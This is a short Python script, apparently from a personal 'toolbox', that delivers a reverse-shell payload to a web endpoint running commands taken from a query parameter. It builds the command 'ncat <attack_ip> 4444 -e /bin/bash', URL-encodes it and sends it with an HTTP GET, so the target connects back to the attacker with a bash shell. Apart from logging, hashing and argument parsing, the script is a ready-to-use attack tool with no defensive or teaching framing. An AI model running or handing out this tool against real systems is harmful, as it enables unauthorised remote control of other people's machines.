#!/usr/bin/env python3
# ┌────────────────────────────────────────────────────────┐
# │ Version        : 2026.07.24-00                         │
# │ Author         : Mark Hamilton │ Co-Pilot AI assisted  │
# │ Script Purpose : Send a reverse-shell to a web endpoint│
# │ Package        : toolbox                               │
# └────────────────────────────────────────────────────────┘
#
# Usage:
#   rev-shell.py --ip <attack_ip> --url <target_url> [--dry-run] [--verbose] [--log] [--hashmap]
#
# Description:
#   Constructs a reverse-shell payload using ncat, URL-encodes it, and sends it to
#   a vulnerable web endpoint that executes commands supplied via a query parameter.
#   When executed on the target, the payload causes the target to connect back to
#   the attacker's listener on port 4444 with /bin/bash attached.
#
# Output Files:
#   /var/log/rev-shell.py.log            (when --log is used)
#   .hashmap/rev-shell.py.hash           (when --hashmap is used)
#   .hashmap/rev-shell.py.timestamp      (when --hashmap is used)
#
# End Help

import argparse
import os
import sys
import hashlib
import datetime
import requests
import urllib.parse

# ─── Metadata ─────────────────────────────────────────────
TOOL_NAME = "rev-shell.py"
VERSION = "2026.07.24-00"

LOGFILE = f"/var/log/{TOOL_NAME}.log"
HASHDIR = ".hashmap"
HASHFILE = f"{HASHDIR}/{TOOL_NAME}.hash"
TIMESTAMP = f"{HASHDIR}/{TOOL_NAME}.timestamp"

# ─── Helpers ──────────────────────────────────────────────
def log(msg, verbose):
    if verbose:
        print(f"[LOG] {msg}")

def write_log(dry_run, verbose, logging, hashmap):
    if logging and not dry_run:
        os.makedirs(os.path.dirname(LOGFILE), exist_ok=True)
        with open(LOGFILE, "a") as lf:
            lf.write("=== " + TOOL_NAME + " ===\n")
            lf.write(str(datetime.datetime.now()) + "\n")
            lf.write(f"Version: {VERSION}\n")
            lf.write(f"Flags: DRY_RUN={dry_run} VERBOSE={verbose} LOGGING={logging} HASHMAP={hashmap}\n")
            lf.write("====================\n")

def write_hashmap():
    os.makedirs(HASHDIR, exist_ok=True)
    with open(TIMESTAMP, "w") as tf:
        tf.write(datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S"))
    with open(HASHFILE, "w") as hf:
        with open(sys.argv[0], "rb") as sf:
            hf.write(hashlib.sha256(sf.read()).hexdigest())

# ─── Main Logic ───────────────────────────────────────────
def main_logic(args):
    log(f"Starting {TOOL_NAME} version {VERSION}", args.verbose)

    payload = f"ncat {args.ip} 4444 -e /bin/bash"
    encoded_payload = urllib.parse.quote(payload)

    log(f"Payload constructed: {payload}", args.verbose)
    log(f"Encoded payload: {encoded_payload}", args.verbose)

    if args.dry_run:
        print("[DRY-RUN] Reverse shell payload delivery simulated.")
        print(f"[DRY-RUN] Would send to: {args.url}{encoded_payload}")
        return

    print("[+] Sending reverse shell payload...")
    requests.get(args.url + encoded_payload)

# ─── Main Entry Point ─────────────────────────────────────
def main():
    parser = argparse.ArgumentParser(description=f"{TOOL_NAME} — toolbox Python tool")
    parser.add_argument("--ip", required=True, help="Attack machine IP address")
    parser.add_argument("--url", required=True,
                        help="Target URL including command parameter (e.g., http://site/exec.php?cmd=)")
    parser.add_argument("--dry-run", action="store_true", help="Simulate actions without executing")
    parser.add_argument("--verbose", action="store_true", help="Enable verbose logging")
    parser.add_argument("--log", action="store_true", help="Write execution details to log file")
    parser.add_argument("--hashmap", action="store_true", help="Generate traceability files")
    args = parser.parse_args()

    main_logic(args)

    if args.log:
        write_log(args.dry_run, args.verbose, args.log, args.hashmap)

    if args.hashmap:
        write_hashmap()

if __name__ == "__main__":
    main()
                 
